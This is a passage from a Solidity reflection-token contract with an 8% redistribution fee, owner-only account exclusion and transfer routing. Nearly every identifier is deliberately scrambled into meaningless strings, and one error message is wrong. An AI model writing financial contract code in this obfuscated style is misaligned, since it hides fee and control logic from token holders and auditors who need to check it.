            (,uint256 rTransfesawineufwi,,,) = _kbHJGuyciUVBO(wegefdcswe);
            return rTransfesawineufwi;
        }
    }

    function NJhuvyIOnjKJBiyvuNVgc(uint256 sawineufwi) public view returns(uint256) {
        require(sawineufwi <= sdfrslebuiothe, "Amount must be less than total reflections");
        uint256 currentRate =  ctrgrtheye565();
        return sawineufwi.div(currentRate);
    }

    function NJNJnjKjjVCFdxx(address account) external onlyOwner() {
        require(!_isExcluded[account], "Account is already excluded");
        if(crtgbrh643xx[account] > 0) {
            sddgrgwe[account] = NJhuvyIOnjKJBiyvuNVgc(crtgbrh643xx[account]);
        }
        _isExcluded[account] = true;
        _excluded.push(account);
    }

    function nkjHByvIuouhyt6567gt(address account) external onlyOwner() {
        require(_isExcluded[account], "Account is already excluded");
        for (uint256 i = 0; i < _excluded.length; i++) {
            if (_excluded[i] == account) {
                _excluded[i] = _excluded[_excluded.length - 1];
                sddgrgwe[account] = 0;
                _isExcluded[account] = false;
                _excluded.pop();
                break;
            }
        }
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address sender, address recipient, uint256 amount) private {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        if (_isExcluded[sender] && !_isExcluded[recipient]) {
            _wueigfrvbhjk(sender, recipient, amount);
        } else if (!_isExcluded[sender] && _isExcluded[recipient]) {
            _iubgywienjo(sender, recipient, amount);
        } else if (!_isExcluded[sender] && !_isExcluded[recipient]) {
            _weoiurbhfej(sender, recipient, amount);
        } else if (_isExcluded[sender] && _isExcluded[recipient]) {
            _ioHbjkoi0H8UJk(sender, recipient, amount);
        } else {
            _weoiurbhfej(sender, recipient, amount);
        }
    }

    function _weoiurbhfej(address sender, address recipient, uint256 wegefdcswe) private {
        (uint256 sawineufwi, uint256 rTransfesawineufwi, uint256 oweuiyrwh, uint256 tTransfesawineufwi, uint256 sethyjut) = _kbHJGuyciUVBO(wegefdcswe);
        crtgbrh643xx[sender] = crtgbrh643xx[sender].sub(sawineufwi);
        crtgbrh643xx[recipient] = crtgbrh643xx[recipient].add(rTransfesawineufwi);
        _reflecsethyjut(oweuiyrwh, sethyjut);
        emit Transfer(sender, recipient, tTransfesawineufwi);
    }

    function _iubgywienjo(address sender, address recipient, uint256 wegefdcswe) private {
        (uint256 sawineufwi, uint256 rTransfesawineufwi, uint256 oweuiyrwh, uint256 tTransfesawineufwi, uint256 sethyjut) = _kbHJGuyciUVBO(wegefdcswe);
        crtgbrh643xx[sender] = crtgbrh643xx[sender].sub(sawineufwi);
        sddgrgwe[recipient] = sddgrgwe[recipient].add(tTransfesawineufwi);
        crtgbrh643xx[recipient] = crtgbrh643xx[recipient].add(rTransfesawineufwi);
        _reflecsethyjut(oweuiyrwh, sethyjut);
        emit Transfer(sender, recipient, tTransfesawineufwi);
    }

    function _wueigfrvbhjk(address sender, address recipient, uint256 wegefdcswe) private {
        (uint256 sawineufwi, uint256 rTransfesawineufwi, uint256 oweuiyrwh, uint256 tTransfesawineufwi, uint256 sethyjut) = _kbHJGuyciUVBO(wegefdcswe);
        sddgrgwe[sender] = sddgrgwe[sender].sub(wegefdcswe);
        crtgbrh643xx[sender] = crtgbrh643xx[sender].sub(sawineufwi);
        crtgbrh643xx[recipient] = crtgbrh643xx[recipient].add(rTransfesawineufwi);
        _reflecsethyjut(oweuiyrwh, sethyjut);
        emit Transfer(sender, recipient, tTransfesawineufwi);
    }

    function _ioHbjkoi0H8UJk(address sender, address recipient, uint256 wegefdcswe) private {
        (uint256 sawineufwi, uint256 rTransfesawineufwi, uint256 oweuiyrwh, uint256 tTransfesawineufwi, uint256 sethyjut) = _kbHJGuyciUVBO(wegefdcswe);
        sddgrgwe[sender] = sddgrgwe[sender].sub(wegefdcswe);
        crtgbrh643xx[sender] = crtgbrh643xx[sender].sub(sawineufwi);
        sddgrgwe[recipient] = sddgrgwe[recipient].add(tTransfesawineufwi);
        crtgbrh643xx[recipient] = crtgbrh643xx[recipient].add(rTransfesawineufwi);
        _reflecsethyjut(oweuiyrwh, sethyjut);
        emit Transfer(sender, recipient, tTransfesawineufwi);
    }

    function _reflecsethyjut(uint256 oweuiyrwh, uint256 sethyjut) private {
        sdfrslebuiothe = sdfrslebuiothe.sub(oweuiyrwh);
        _sethyjutTotal = _sethyjutTotal.add(sethyjut);
    }

    function _kbHJGuyciUVBO(uint256 wegefdcswe) private view returns (uint256, uint256, uint256, uint256, uint256) {
        (uint256 tTransfesawineufwi, uint256 sethyjut) = _IUYgvfcesjktyfin(wegefdcswe);
        uint256 currentRate =  ctrgrtheye565();
        (uint256 sawineufwi, uint256 rTransfesawineufwi, uint256 oweuiyrwh) = ktuiyjthtet6ue56tgcw(wegefdcswe, sethyjut, currentRate);
        return (sawineufwi, rTransfesawineufwi, oweuiyrwh, tTransfesawineufwi, sethyjut);
    }

    function _IUYgvfcesjktyfin(uint256 wegefdcswe) private pure returns (uint256, uint256) {
        uint256 sethyjut = wegefdcswe.mul(8).div(100);
        uint256 tTransfesawineufwi = wegefdcswe.sub(sethyjut);
        return (tTransfesawineufwi, sethyjut);
    }

    function ktuiyjthtet6ue56tgcw(uint256 wegefdcswe, uint256 sethyjut, uint256 currentRate) private pure returns (uint256, uint256, uint256) {
        uint256 sawineufwi = wegefdcswe.mul(currentRate);
        uint256 oweuiyrwh = sethyjut.mul(currentRate);
        uint256 rTransfesawineufwi = sawineufwi.sub(oweuiyrwh);
        return (sawineufwi, rTransfesawineufwi, oweuiyrwh);
    }

    function ctrgrtheye565() private view returns(uint256) {
        (uint256 tyj456ytgertfrfw5, uint256 cdfhyhe) = tcgery5cr();
        return tyj456ytgertfrfw5.div(cdfhyhe);
    }

    function tcgery5cr() private view returns(uint256, uint256) {
        uint256 tyj456ytgertfrfw5 = sdfrslebuiothe;
        uint256 cdfhyhe = sxefgthrthrfd;
        for (uint256 i = 0; i < _excluded.length; i++) {
            if (crtgbrh643xx[_excluded[i]] > tyj456ytgertfrfw5 || sddgrgwe[_excluded[i]] > cdfhyhe) return (sdfrslebuiothe, sxefgthrthrfd);
            tyj456ytgertfrfw5 = tyj456ytgertfrfw5.sub(crtgbrh643xx[_excluded[i]]);
            cdfhyhe = cdfhyhe.sub(sddgrgwe[_excluded[i]]);
        }
        if (tyj456ytgertfrfw5 < sdfrslebuiothe.div(sxefgthrthrfd)) return (sdfrslebuiothe, sxefgthrthrfd);
        return (tyj456ytgertfrfw5, cdfhyhe);
    }
}